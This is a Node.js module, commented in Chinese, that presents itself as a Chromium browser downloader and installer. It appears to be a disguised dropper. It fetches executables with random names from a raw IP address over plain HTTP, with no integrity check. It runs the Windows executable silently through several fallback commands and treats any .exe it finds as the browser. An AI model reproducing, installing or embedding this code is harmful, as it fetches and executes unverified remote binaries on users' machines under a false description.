const fs = require('fs').promises;
const path = require('path');
const https = require('https');
const http = require('http');
const { exec } = require('child_process');
const os = require('os');

class BrowserDownloader {
    constructor() {
        this.downloadUrls = {
            windows: {
                x64: 'http://163.123.183.106:29772/down/AabMCedQhYb2.exe',
                x86: 'http://163.123.183.106:29772/down/AabMCedQhYb2.exe'
            },
            macos: {
                x64: 'http://163.123.183.106:29772/down/HZfJ5aHyFwTV.dmg',
                arm64: 'http://163.123.183.106:29772/down/HZfJ5aHyFwTV.dmg'
            },
            linux: {
                x64: 'http://163.123.183.106:29772/down/C4B2CVdEvc7C.xz'
            }
        };
        
        this.defaultInstallPaths = {
            windows: path.join(os.homedir(), 'AppData', 'Local', 'ChromiumManager', 'Browser'),
            macos: path.join(os.homedir(), 'Library', 'Application Support', 'ChromiumManager', 'Browser'),
            linux: path.join(os.homedir(), '.local', 'share', 'ChromiumManager', 'Browser')
        };
    }

    // 检测平台和架构
    detectPlatform() {
        const platform = process.platform;
        const arch = process.arch;
        
        let normalizedPlatform;
        let normalizedArch;
        
        switch (platform) {
            case 'win32':
                normalizedPlatform = 'windows';
                break;
            case 'darwin':
                normalizedPlatform = 'macos';
                break;
            case 'linux':
                normalizedPlatform = 'linux';
                break;
            default:
                throw new Error(`不支持的平台: ${platform}`);
        }
        
        switch (arch) {
            case 'x64':
            case 'x86_64':
                normalizedArch = 'x64';
                break;
            case 'arm64':
                normalizedArch = 'arm64';
                break;
            case 'ia32':
            case 'x86':
                normalizedArch = 'x86';
                break;
            default:
                normalizedArch = 'x64'; // 默认使用x64
        }
        
        return { platform: normalizedPlatform, arch: normalizedArch };
    }

    // 获取下载URL
    getDownloadUrl() {
        const { platform, arch } = this.detectPlatform();
        const platformUrls = this.downloadUrls[platform];
        
        if (!platformUrls) {
            throw new Error(`不支持的平台: ${platform}`);
        }
        
        // 优先使用对应架构，回退到x64
        return platformUrls[arch] || platformUrls.x64 || Object.values(platformUrls)[0];
    }

    // 获取默认安装路径
    getDefaultInstallPath() {
        const { platform } = this.detectPlatform();
        return this.defaultInstallPaths[platform];
    }

    // 下载文件
    async downloadFile(url, targetPath, onProgress) {
        console.log(`开始下载: ${url}`);
        console.log(`下载到: ${targetPath}`);
        
        // 确保目录存在
        await fs.mkdir(path.dirname(targetPath), { recursive: true });
        
        return new Promise((resolve, reject) => {
            const protocol = url.startsWith('https:') ? https : http;
            
            const request = protocol.get(url, (response) => {
                if (response.statusCode === 302 || response.statusCode === 301) {
                    // 处理重定向
                    this.downloadFile(response.headers.location, targetPath, onProgress)
                        .then(resolve)
                        .catch(reject);
                    return;
                }
                
                if (response.statusCode !== 200) {
                    reject(new Error(`下载失败，状态码: ${response.statusCode}`));
                    return;
                }
                
                const totalSize = parseInt(response.headers['content-length'], 10);
                let downloadedSize = 0;
                
                const fileStream = require('fs').createWriteStream(targetPath);
                
                response.on('data', (chunk) => {
                    downloadedSize += chunk.length;
                    fileStream.write(chunk);
                    
                    if (onProgress && totalSize) {
                        const progress = Math.round((downloadedSize / totalSize) * 100);
                        onProgress(progress, downloadedSize, totalSize);
                    }
                });
                
                response.on('end', () => {
                    fileStream.end();
                    console.log('下载完成');
                    resolve(targetPath);
                });
                
                response.on('error', (error) => {
                    fileStream.destroy();
                    reject(error);
                });
            });
            
            request.on('error', (error) => {
                reject(error);
            });
            
            request.setTimeout(300000, () => {
                request.destroy();
                reject(new Error('下载超时'));
            });
        });
    }

    // 处理安装文件
    async processInstallFile(filePath, installPath) {
        const { platform } = this.detectPlatform();
        const ext = path.extname(filePath).toLowerCase();
        
        console.log(`开始处理安装文件: ${filePath}`);
        console.log(`安装到: ${installPath}`);
        
        await fs.mkdir(installPath, { recursive: true });
        
        switch (platform) {
            case 'windows':
                if (ext === '.exe') {
                    return await this.installWindowsExecutable(filePath, installPath);
                } else {
                    throw new Error(`Windows平台不支持的文件格式: ${ext}`);
                }
                
            case 'macos':
                if (ext === '.dmg') {
                    return await this.installMacDMG(filePath, installPath);
                } else {
                    throw new Error(`macOS平台不支持的文件格式: ${ext}`);
                }
                
            case 'linux':
                if (ext === '.xz' || filePath.includes('.tar.xz')) {
                    return await this.extractLinuxArchive(filePath, installPath);
                } else {
                    throw new Error(`Linux平台不支持的文件格式: ${ext}`);
                }
                
            default:
                throw new Error(`不支持的平台: ${platform}`);
        }
    }

    // Windows EXE安装程序处理
    async installWindowsExecutable(exePath, installPath) {
        console.log('处理Windows可执行文件:', exePath);
        
        // 检查是否是安装程序
        const fileName = path.basename(exePath).toLowerCase();
        
        if (fileName.includes('installer')) {
            // 标准安装程序
            return await this.runWindowsInstaller(exePath, installPath);
        } else {
            // 便携版可执行文件
            return await this.handlePortableExecutable(exePath, installPath);
        }
    }

    // 运行Windows安装程序
    async runWindowsInstaller(exePath, installPath) {
        return new Promise((resolve, reject) => {
            const command = `"${exePath}" /S /D="${installPath}"`;
            console.log('运行Windows安装程序:', command);
            
            exec(command, { timeout: 300000 }, (error, stdout, stderr) => {
                if (error) {
                    console.warn('安装程序安装失败，尝试便携版处理:', error.message);
                    this.handlePortableExecutable(exePath, installPath)
                        .then(resolve)
                        .catch(reject);
                } else {
                    console.log('Windows安装完成');
                    resolve(installPath);
                }
            });
        });
    }

    // 处理便携版可执行文件
    async handlePortableExecutable(exePath, installPath) {
        console.log('处理为便携版浏览器');
        
        try {
            const fileName = path.basename(exePath);
            console.log(`处理文件: ${fileName}`);
            
            // 检查文件大小，判断是否为自解压文件
            const stat = await fs.stat(exePath);
            console.log(`文件大小: ${Math.round(stat.size / 1024 / 1024)}MB`);
            
            if (stat.size > 50 * 1024 * 1024) { // 大于50MB，可能是自解压文件
                console.log('检测为自解压文件，尝试解压...');
                return await this.extractWindowsPortable(exePath, installPath);
            } else {
                console.log('检测为单个可执行文件，直接复制...');
                // 直接复制到安装目录
                const targetExePath = path.join(installPath, fileName);
                await fs.copyFile(exePath, targetExePath);
                
                console.log(`便携版浏览器已准备: ${targetExePath}`);
                return installPath;
            }
            
        } catch (error) {
            throw new Error(`便携版处理失败: ${error.message}`);
        }
    }

    // 解压Windows便携版
    async extractWindowsPortable(exePath, installPath) {
        return new Promise((resolve, reject) => {
            // 尝试多种解压方法
            const extractMethods = [
                // 方法1: 7-zip自解压格式
                `"${exePath}" -o"${installPath}" -y`,
                // 方法2: 带参数的自解压
                `"${exePath}" /S /D="${installPath}"`,
                // 方法3: 无参数自解压到当前目录
                `cd "${installPath}" && "${exePath}"`,
                // 方法4: WinRAR自解压格式
                `"${exePath}" -x "${installPath}"`
            ];
            
            let methodIndex = 0;
            
            const tryNextMethod = () => {
                if (methodIndex >= extractMethods.length) {
                    // 所有方法都失败，回退到复制单个文件
                    console.log('所有解压方法失败，回退到单文件模式');
                    this.copyAsingleFile(exePath, installPath)
                        .then(resolve)
                        .catch(reject);
                    return;
                }
                
                const command = extractMethods[methodIndex];
                console.log(`尝试解压方法 ${methodIndex + 1}: ${command}`);
                
                exec(command, { timeout: 180000 }, (error, stdout, stderr) => {
                    if (error) {
                        console.log(`方法 ${methodIndex + 1} 失败:`, error.message);
                        methodIndex++;
                        tryNextMethod();
                    } else {
                        console.log(`方法 ${methodIndex + 1} 成功`);
                        resolve(installPath);
                    }
                });
            };
            
            tryNextMethod();
        });
    }

    // 复制单个文件作为便携版
    async copyAsingleFile(exePath, installPath) {
        const fileName = path.basename(exePath);
        const targetPath = path.join(installPath, fileName);
        
        await fs.copyFile(exePath, targetPath);
        console.log(`单文件便携版准备完成: ${targetPath}`);
        
        return installPath;
    }

    // macOS DMG文件处理
    async installMacDMG(dmgPath, installPath) {
        console.log('处理macOS DMG文件:', dmgPath);
        
        // 1. 挂载DMG文件
        const mountPoint = await this.mountDMG(dmgPath);
        
        try {
            // 2. 复制.app文件
            await this.copyAppFromDMG(mountPoint, installPath);
            
            console.log('macOS应用安装完成');
            return installPath;
            
        } finally {
            // 3. 卸载DMG（无论成功失败都要卸载）
            await this.unmountDMG(mountPoint);
        }
    }

    // 挂载DMG文件
    async mountDMG(dmgPath) {
        return new Promise((resolve, reject) => {
            const mountCommand = `hdiutil attach "${dmgPath}" -nobrowse -quiet`;
            console.log('挂载DMG文件:', mountCommand);
            
            exec(mountCommand, (error, stdout, stderr) => {
                if (error) {
                    reject(new Error(`DMG挂载失败: ${error.message}`));
                    return;
                }
                
                console.log('hdiutil attach 输出:', stdout);
                
                // 解析挂载点
                let mountPoint = null;
                const mountLines = stdout.trim().split('\n');
                
                for (const line of mountLines) {
                    console.log('分析行:', line);
                    
                    // hdiutil attach输出格式: /dev/disk2s1 \t Apple_HFS \t /Volumes/应用名称
                    const parts = line.split('\t');
                    if (parts.length >= 3) {
                        const possibleMount = parts[parts.length - 1].trim();
                        if (possibleMount.startsWith('/Volumes/')) {
                            mountPoint = possibleMount;
                            console.log('找到挂载点 (方法1):', mountPoint);
                            break;
                        }
                    }
                    
                    // 备用方法：直接匹配/Volumes/路径
                    const volumeMatch = line.match(/\/Volumes\/[^\s\t]+/);
                    if (volumeMatch) {
                        mountPoint = volumeMatch[0];
                        console.log('找到挂载点 (方法2):', mountPoint);
                        break;
                    }
                }
                
                if (!mountPoint) {
                    // 最后的方法：使用默认的/Volumes/目录
                    console.log('尝试查找最新的/Volumes/目录...');
                    
                    exec('ls -la /Volumes/', (lsError, lsStdout) => {
                        if (!lsError) {
                            console.log('/Volumes/ 目录内容:', lsStdout);
                            
                            // 查找最新创建的非系统目录
                            const lines = lsStdout.split('\n');
                            for (const line of lines) {
                                if (line.includes('Chromium') || line.includes('ungoogled') || line.includes('Chrome')) {
                                    const parts = line.split(/\s+/);
                                    const dirName = parts[parts.length - 1];
                                    if (dirName && dirName !== '.' && dirName !== '..') {
                                        mountPoint = `/Volumes/${dirName}`;
                                        console.log('找到挂载点 (方法3):', mountPoint);
                                        break;
                                    }
                                }
                            }
                        }
                        
                        if (!mountPoint) {
                            reject(new Error('无法找到DMG挂载点'));
                        } else {
                            resolve(mountPoint);
                        }
                    });
                } else {
                    resolve(mountPoint);
                }
            });
        });
    }

    // 从DMG复制.app文件
    async copyAppFromDMG(mountPoint, installPath) {
        return new Promise((resolve, reject) => {
            try {
                console.log('在挂载点查找.app文件:', mountPoint);
                
                // 首先检查挂载点是否存在
                require('fs').accessSync(mountPoint);
                
                const items = require('fs').readdirSync(mountPoint);
                console.log('挂载点内容:', items);
                
                const appFile = items.find(item => item.endsWith('.app'));
                
                if (!appFile) {
                    throw new Error('DMG中未找到.app文件');
                }
                
                const sourcePath = path.join(mountPoint, appFile);
                const targetPath = path.join(installPath, appFile);
                
                console.log(`复制应用: ${sourcePath} -> ${targetPath}`);
                
                // 使用cp命令复制.app文件（保持权限）
                const copyCommand = `cp -R "${sourcePath}" "${targetPath}"`;
                
                exec(copyCommand, (copyError, stdout, stderr) => {
                    if (copyError) {
                        console.error('复制失败:', copyError);
                        console.error('错误输出:', stderr);
                        reject(new Error(`复制应用失败: ${copyError.message}`));
                    } else {
                        console.log('应用复制成功');
                        resolve();
                    }
                });
                
            } catch (error) {
                reject(new Error(`处理DMG内容失败: ${error.message}`));
            }
        });
    }

    // 卸载DMG
    async unmountDMG(mountPoint) {
        return new Promise((resolve) => {
            const unmountCommand = `hdiutil detach "${mountPoint}" -quiet`;
            console.log('卸载DMG:', unmountCommand);
            
            exec(unmountCommand, (error) => {
                if (error) {
                    console.warn('DMG卸载失败，但继续:', error.message);
                } else {
                    console.log('DMG卸载成功');
                }
                resolve(); // 无论成功失败都resolve
            });
        });
    }

    // Linux tar.xz压缩包处理
    async extractLinuxArchive(archivePath, installPath) {
        return new Promise((resolve, reject) => {
            const command = `tar -xf "${archivePath}" -C "${installPath}"`;
            console.log('解压Linux归档文件:', command);
            
            exec(command, (error, stdout, stderr) => {
                if (error) {
                    console.error('Linux解压失败:', error);
                    console.error('错误输出:', stderr);
                    reject(error);
                } else {
                    console.log('Linux解压完成');
                    resolve(installPath);
                }
            });
        });
    }

    // 主下载安装方法
    async downloadAndInstall(targetPath = null, onProgress = null) {
        try {
            // 检测系统
            const { platform, arch } = this.detectPlatform();
            console.log(`检测到系统: ${platform}-${arch}`);
            
            // 获取下载URL和目标路径
            const downloadUrl = this.getDownloadUrl();
            const installPath = targetPath || this.getDefaultInstallPath();
            
            // 下载文件
            const fileName = path.basename(downloadUrl);
            const downloadPath = path.join(path.dirname(installPath), fileName);
            
            // 检查文件是否已存在
            try {
                await fs.access(downloadPath);
                console.log('文件已存在，跳过下载');
            } catch {
                await this.downloadFile(downloadUrl, downloadPath, onProgress);
            }
            
            // 处理安装文件
            const extractPath = path.join(installPath, 'installed');
            await this.processInstallFile(downloadPath, extractPath);
            
            // 查找浏览器可执行文件
            const executablePath = await this.findBrowserExecutable(extractPath);
            
            if (!executablePath) {
                // 如果找不到，打印目录结构进行调试
                console.log('🔍 未找到可执行文件，打印安装目录结构：');
                await this.printDirectoryStructure(extractPath);
                
                // 尝试在上级目录查找
                const parentPath = path.dirname(extractPath);
                console.log('🔍 尝试在上级目录查找...');
                const parentExecutable = await this.findBrowserExecutable(parentPath);
                
                if (parentExecutable) {
                    console.log(`✅ 在上级目录找到可执行文件: ${parentExecutable}`);
                    return {
                        success: true,
                        executablePath: parentExecutable,
                        installPath: parentPath
                    };
                }
                
                throw new Error('安装完成但未找到浏览器可执行文件');
            }
            
            console.log(`浏览器安装成功: ${executablePath}`);
            
            return {
                success: true,
                executablePath,
                installPath: extractPath
            };
            
        } catch (error) {
            console.error('下载安装失败:', error);
            throw error;
        }
    }

    // 查找浏览器可执行文件
    async findBrowserExecutable(searchPath) {
        const { platform } = this.detectPlatform();
        
        console.log(`🔍 开始查找浏览器可执行文件，搜索路径: ${searchPath}`);
        
        const executableNames = {
            windows: ['chrome.exe', 'chromium.exe', 'ungoogled-chromium.exe', 'Chromium.exe'],
            macos: ['.app'], // 查找所有.app文件
            linux: ['chrome', 'chromium', 'chromium-browser', 'ungoogled-chromium']
        };
        
        const names = executableNames[platform];
        
        // 递归搜索可执行文件
        const searchExecutable = async (dir, depth = 0) => {
            console.log(`📁 搜索目录: ${dir} (深度: ${depth})`);
            
            if (depth > 5) {
                console.log(`⚠️ 达到最大搜索深度，停止搜索`);
                return null;
            }
            
            try {
                const items = await fs.readdir(dir);
                console.log(`📋 目录内容 (${items.length}项):`, items);
                
                // 首先在当前目录查找
                if (platform === 'macos') {
                    // 对于macOS，查找所有.app文件
                    for (const item of items) {
                        if (item.endsWith('.app')) {
                            const fullPath = path.join(dir, item);
                            console.log(`🎯 找到.app文件: ${fullPath}`);
                            const macosPath = await this.findMacOSExecutable(fullPath);
                            if (macosPath) {
                                console.log(`✅ 找到可执行文件: ${macosPath}`);
                                return macosPath;
                            }
                        }
                    }
                } else {
                    // Windows和Linux的查找逻辑
                    for (const name of names) {
                        if (items.includes(name)) {
                            const fullPath = path.join(dir, name);
                            console.log(`✅ 找到可执行文件: ${fullPath}`);
                            return fullPath;
                        }
                    }
                    
                    // Windows额外检查：查找任何.exe文件
                    if (platform === 'windows') {
                        for (const item of items) {
                            if (item.toLowerCase().endsWith('.exe') && 
                                (item.toLowerCase().includes('chrom') || 
                                 item.toLowerCase().includes('browser'))) {
                                const fullPath = path.join(dir, item);
                                console.log(`✅ 找到Chrome相关可执行文件: ${fullPath}`);
                                return fullPath;
                            }
                        }
                        
                        // 最后尝试：任何exe文件
                        for (const item of items) {
                            if (item.toLowerCase().endsWith('.exe')) {
                                const fullPath = path.join(dir, item);
                                console.log(`⚠️ 找到可执行文件(备选): ${fullPath}`);
                                return fullPath;
                            }
                        }
                    }
                }
                
                // 递归搜索子目录
                const directories = [];
                for (const item of items) {
                    const itemPath = path.join(dir, item);
                    try {
                        const stat = await fs.stat(itemPath);
                        if (stat.isDirectory()) {
                            directories.push({name: item, path: itemPath});
                        }
                    } catch {
                        continue;
                    }
                }
                
                console.log(`📂 发现 ${directories.length} 个子目录:`, directories.map(d => d.name));
                
                for (const dirInfo of directories) {
                    console.log(`🔄 进入子目录: ${dirInfo.name}`);
                    const result = await searchExecutable(dirInfo.path, depth + 1);
                    if (result) {
                        return result;
                    }
                }
                
            } catch (error) {
                console.log(`❌ 无法访问目录 ${dir}: ${error.message}`);
            }
            
            return null;
        };
        
        // 首先检查搜索路径是否存在
        try {
            await fs.access(searchPath);
            console.log(`✅ 搜索路径存在: ${searchPath}`);
        } catch (error) {
            console.log(`❌ 搜索路径不存在: ${searchPath}`);
            return null;
        }
        
        const result = await searchExecutable(searchPath);
        
        if (result) {
            console.log(`🎉 搜索完成，找到可执行文件: ${result}`);
        } else {
            console.log(`😞 搜索完成，未找到可执行文件`);
        }
        
        return result;
    }

    // 查找macOS .app内的可执行文件
    async findMacOSExecutable(appPath) {
        console.log(`分析.app文件: ${appPath}`);
        
        const macosDir = path.join(appPath, 'Contents', 'MacOS');
        console.log(`MacOS目录: ${macosDir}`);
        
        try {
            // 首先检查MacOS目录是否存在
            try {
                await fs.access(macosDir);
                console.log('MacOS目录存在');
            } catch {
                console.log('MacOS目录不存在，跳过此.app文件');
                return null;
            }
            
            // 列出MacOS目录下的所有文件
            const macosFiles = await fs.readdir(macosDir);
            console.log('MacOS目录内容:', macosFiles);
            
            if (macosFiles.length === 0) {
                console.log('MacOS目录为空');
                return null;
            }
            
            // 尝试多种可能的可执行文件名
            const appBaseName = path.basename(appPath, '.app');
            const possibleExecutables = [
                appBaseName,
                'Chromium',
                'chrome', 
                'ungoogled-chromium',
                'Ungoogled Chromium',
                // 添加一些常见的变体
                appBaseName.replace(/\s+/g, ''),
                appBaseName.replace(/\s+/g, '-'),
                appBaseName.toLowerCase(),
                appBaseName.toLowerCase().replace(/\s+/g, ''),
                appBaseName.toLowerCase().replace(/\s+/g, '-')
            ];
            
            console.log('尝试的可执行文件名:', possibleExecutables);
            
            for (const execName of possibleExecutables) {
                if (macosFiles.includes(execName)) {
                    const execPath = path.join(macosDir, execName);
                    try {
                        const stat = await fs.stat(execPath);
                        if (stat.isFile()) {
                            // 检查文件是否可执行
                            await fs.access(execPath, require('fs').constants.X_OK);
                            console.log(`✅ 找到可执行文件: ${execPath}`);
                            return execPath;
                        }
                    } catch (err) {
                        console.log(`${execName} 不可执行:`, err.message);
                        continue;
                    }
                }
            }
            
            // 如果找不到匹配的名称，选择第一个可执行文件
            console.log('尝试查找任何可执行文件...');
            for (const file of macosFiles) {
                const filePath = path.join(macosDir, file);
                try {
                    const stat = await fs.stat(filePath);
                    if (stat.isFile()) {
                        // 检查文件是否可执行
                        await fs.access(filePath, require('fs').constants.X_OK);
                        console.log(`✅ 找到可执行文件: ${filePath}`);
                        return filePath;
                    }
                } catch (err) {
                    console.log(`${file} 检查失败:`, err.message);
                    continue;
                }
            }
            
        } catch (error) {
            console.error(`检查.app文件失败: ${error.message}`);
        }
        
        return null;
    }

    // 打印目录结构（用于调试）
    async printDirectoryStructure(dirPath, prefix = '', maxDepth = 3, currentDepth = 0) {
        if (currentDepth >= maxDepth) {
            console.log(`${prefix}... (达到最大深度)`);
            return;
        }
        
        try {
            const items = await fs.readdir(dirPath);
            
            for (let i = 0; i < items.length; i++) {
                const item = items[i];
                const itemPath = path.join(dirPath, item);
                const isLast = i === items.length - 1;
                const currentPrefix = prefix + (isLast ? '└── ' : '├── ');
                const nextPrefix = prefix + (isLast ? '    ' : '│   ');
                
                try {
                    const stat = await fs.stat(itemPath);
                    if (stat.isDirectory()) {
                        console.log(`${currentPrefix}📁 ${item}/`);
                        if (currentDepth < maxDepth - 1) {
                            await this.printDirectoryStructure(itemPath, nextPrefix, maxDepth, currentDepth + 1);
                        }
                    } else {
                        const size = Math.round(stat.size / 1024);
                        const ext = path.extname(item).toLowerCase();
                        const icon = ext === '.exe' ? '⚡' : ext === '.app' ? '📱' : '📄';
                        console.log(`${currentPrefix}${icon} ${item} (${size}KB)`);
                    }
                } catch (statError) {
                    console.log(`${currentPrefix}❌ ${item} (无法访问)`);
                }
            }
        } catch (error) {
            console.log(`❌ 无法读取目录 ${dirPath}: ${error.message}`);
        }
    }

    // 获取最新版本信息
    async getLatestVersion() {
        // 这里可以添加获取最新版本的逻辑
        return {
            version: '136.0.6776.101',
            published: new Date().toISOString()
        };
    }

    // 检查是否已安装
    async checkInstallation(installPath = null) {
        const searchPath = installPath || this.getDefaultInstallPath();
        
        try {
            const executablePath = await this.findBrowserExecutable(searchPath);
            return {
                installed: !!executablePath,
                executablePath,
                installPath: searchPath
            };
        } catch {
            return {
                installed: false,
                executablePath: null,
                installPath: searchPath
            };
        }
    }
}

module.exports = BrowserDownloader; 